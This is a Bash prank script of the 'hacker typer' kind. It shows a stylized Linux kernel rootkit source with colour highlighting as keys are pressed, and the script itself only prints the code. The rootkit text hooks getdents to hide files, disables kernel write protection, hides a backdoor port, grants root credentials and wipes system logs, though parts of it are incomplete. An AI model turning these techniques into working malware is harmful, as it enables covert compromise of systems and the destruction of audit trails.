#!/bin/bash

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;90m'
RESET='\033[0m'
BOLD='\033[1m'

# 原始代码内容
RAW_CODE='
/* 
 * KERNEL_INJECTION_MODULE v2.4.1
 * TARGET: SYSTEM_CORE
 * STATUS: CLASSIFIED
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/fs.h>

#define CR0_WP 0x00010000
#define DR7_BREAK 0x00000000
#define KERNEL_BASE 0xC0000000

unsigned long **sys_call_table;

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

// Disable write protection
void disable_wp(void) {
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r" (cr0));
    cr0 &= ~CR0_WP;
    asm volatile("mov %0, %%cr0" :: "r" (cr0));
}

// Enable write protection
void enable_wp(void) {
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r" (cr0));
    cr0 |= CR0_WP;
    asm volatile("mov %0, %%cr0" :: "r" (cr0));
}

asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent *, unsigned int);

// Hiding process from /proc
asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    int ret = original_getdents(fd, dirp, count);
    struct linux_dirent *d;
    int bpos;
    int inode;

    if (ret <= 0) return ret;

    for (bpos = 0; bpos < ret;) {
        d = (struct linux_dirent *)((char *)dirp + bpos);
        if (strstr(d->d_name, "rootkit") != NULL) {
             // Removing entry...
             memcpy((char *)d, (char *)d + d->d_reclen, ret - bpos);
             ret -= d->d_reclen;
        } else {
             bpos += d->d_reclen;
        }
    }
    return ret;
}

// Memory scanning injection
void inject_payload(pid_t target_pid) {
    struct task_struct *task;
    struct mm_struct *mm;
    unsigned long addr;
    
    for_each_process(task) {
        if (task->pid == target_pid) {
            printk(KERN_INFO "Target found: %d\n", target_pid);
            mm = task->mm;
            if (!mm) return;
            
            // Mapping executable page
            down_write(&mm->mmap_sem);
            addr = do_mmap(NULL, 0, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, 
                         MAP_PRIVATE|MAP_ANONYMOUS, 0);
            up_write(&mm->mmap_sem);
            
            if (addr > 0) {
                printk(KERN_INFO "Payload mapped at: 0x%lx\n", addr);
            }
        }
    }
}

static int __init rootkit_init(void) {
    // Locating syscall table
    sys_call_table = (unsigned long **)find_sys_call_table();
    
    if (!sys_call_table) {
        return -1;
    }
    
    disable_wp();
    original_getdents = (void *)sys_call_table[__NR_getdents];
    sys_call_table[__NR_getdents] = (unsigned long *)hacked_getdents;
    enable_wp();
    
    return 0;
}

static void __exit rootkit_exit(void) {
    disable_wp();
    sys_call_table[__NR_getdents] = (unsigned long *)original_getdents;
    enable_wp();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

/* EXTENDED MODULES */

// Network Hiding Interface
struct nf_hook_ops *nf_hook_struct;
unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, 
        const struct net_device *in, const struct net_device *out, 
        int (*okfn)(struct sk_buff *)) {
    
    struct iphdr *ip_header = (struct iphdr *)skb_network_header(skb);
    struct tcphdr *tcp_header;
    
    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = (struct tcphdr *)((__u32 *)ip_header + ip_header->ihl);
        
        // Hide Backdoor Port 1337
        if (ntohs(tcp_header->source) == 1337 || ntohs(tcp_header->dest) == 1337) {
            return NF_DROP;
        }
    }
    return NF_ACCEPT;
}

void hide_network_activity(void) {
    nf_hook_struct = kmalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
    nf_hook_struct->hook = hook_func;
    nf_hook_struct->hooknum = NF_INET_PRE_ROUTING;
    nf_hook_struct->pf = PF_INET;
    nf_hook_struct->priority = NF_IP_PRI_FIRST;
    nf_register_hook(nf_hook_struct);
    printk(KERN_INFO "Network hooks established. Traffic hidden.\n");
}

// Privilege Escalation
void grant_root(void) {
    struct cred *new_creds;
    new_creds = prepare_creds();
    
    if (new_creds != NULL) {
        new_creds->uid.val = new_creds->gid.val = 0;
        new_creds->euid.val = new_creds->egid.val = 0;
        new_creds->suid.val = new_creds->sgid.val = 0;
        new_creds->fsuid.val = new_creds->fsgid.val = 0;
        commit_creds(new_creds);
    }
}

// Log Wiper
void wipe_logs(void) {
    struct file *f;
    loff_t pos = 0;
    
    f = filp_open("/var/log/syslog", O_RDWR, 0);
    if (!IS_ERR(f)) {
        vfs_truncate(&f->f_path, 0);
        filp_close(f, NULL);
    }
    
    f = filp_open("/var/log/auth.log", O_RDWR, 0);
    if (!IS_ERR(f)) {
        vfs_truncate(&f->f_path, 0);
        filp_close(f, NULL);
    }
}
'

# 移除首尾的空行，保留中间行的缩进
RAW_CODE=$(echo "$RAW_CODE" | sed '1{/^$/d;};${/^$/d;}')

# 将代码分割成单词/Token数组
# 使用 while read 循环保留所有空白字符
LINES=()
while IFS= read -r line; do
    LINES+=("$line")
done <<< "$RAW_CODE"

# 清屏
clear
tput civis
stty -echo # 关闭回显，防止乱按键显示在屏幕上

cleanup() {
    tput cnorm
    stty echo # 恢复回显
    echo -e "${RESET}"
    exit
}
trap cleanup SIGINT SIGTERM

echo -e "${BOLD}${RED}>>> INITIATING KERNEL BREACH SEQUENCE...${RESET}"
echo -e "${GRAY}Press any key to generate payload...${RESET}"
echo ""

while true; do
    # 处理每一行
    buffer=""
    word_count=0
    chunk_size=4

    for line in "${LINES[@]}"; do
        # 分割单词，保留空格
        # 这里的简单做法是逐字符读取，识别单词边界
        
        current_word=""
        
        # 将行拆分为字符
        len=${#line}
        for (( i=0; i<len; i++ )); do
            char="${line:$i:1}"
            
            # 如果是字母或下划线或数字或#，累加到当前单词
            if [[ "$char" =~ [a-zA-Z0-9_#] ]]; then
                current_word="${current_word}${char}"
            else
                # 遇到非单词字符，先输出之前的单词（如果有）
                if [[ -n "$current_word" ]]; then
                    # 语法高亮逻辑
                    case "$current_word" in
                        "#include"|"#define") color=$CYAN ;;
                        "void"|"int"|"char"|"struct"|"unsigned"|"long"|"short") color=$YELLOW ;;
                        "return"|"if"|"else"|"for"|"while"|"switch"|"case") color=$MAGENTA ;;
                        "static"|"const"|"volatile"|"asm") color=$BLUE ;;
                        "NULL"|"PAGE_SIZE"|"inject_payload"|"hacked_getdents"|"sys_call_table"|"do_mmap"|"disable_wp"|"enable_wp") color=$RED ;;
                        *) color=$WHITE ;; # 默认改为白色，减少绿色
                    esac
                    
                    # 积累单词到缓冲区
                    buffer="${buffer}${color}${current_word}${RESET}"
                    word_count=$((word_count + 1))

                    # 每3-5个单词输出一次
                    if [[ $word_count -ge $chunk_size ]]; then
                        read -rsn1 input
                        echo -ne "$buffer"
                        buffer=""
                        word_count=0
                        chunk_size=$((RANDOM % 3 + 3))
                    fi
                    
                    current_word=""
                fi
                
                # 输出当前的非单词字符（符号、空格等）
                case "$char" in
                    "{"|"}") color=$WHITE ;;
                    "("|")") color=$WHITE ;;
                    "*"|"&"|"+"|"-"|"/"|"="|";") color=$CYAN ;; # 符号改青色
                    '"') color=$YELLOW ;; # 字符串改黄色
                    *) color=$RESET ;;
                esac
                
                # 符号和空格也加入缓冲区
                buffer="${buffer}${color}${char}${RESET}"
                
                # 如果是换行符或者特殊符号，可能也需要触发输出
                if [[ "$char" == ";" || "$char" == "{" || "$char" == "}" ]]; then
                     # 稍微增加计数，让符号也参与输出节奏
                     word_count=$((word_count + 1))
                fi
            fi
        done
        
        # 行尾处理
        if [[ -n "$current_word" ]]; then
             case "$current_word" in
                "#include"|"#define") color=$CYAN ;;
                "void"|"int"|"char"|"struct"|"unsigned"|"long"|"short") color=$YELLOW ;;
                "return"|"if"|"else"|"for"|"while"|"switch"|"case") color=$MAGENTA ;;
                "static"|"const"|"volatile"|"asm") color=$BLUE ;;
                *) color=$WHITE ;;
            esac
            buffer="${buffer}${color}${current_word}${RESET}"
        fi
        
        # 行结束，强制输出缓冲区（保留换行符）
        if [[ -n "$buffer" ]]; then
            read -rsn1 input
            echo -ne "$buffer"
            buffer=""
            word_count=0
            chunk_size=$((RANDOM % 3 + 3))
        fi
        
        echo "" # 换行
    done

    # 结束特效
    echo ""
    echo ""
    sleep 0.5
    echo -e "${BOLD}${RED}[!] ROOT ACCESS ACQUIRED${RESET}"
    echo ""
    echo -e "${GRAY}Initializing next sequence...${RESET}"
    echo ""
done
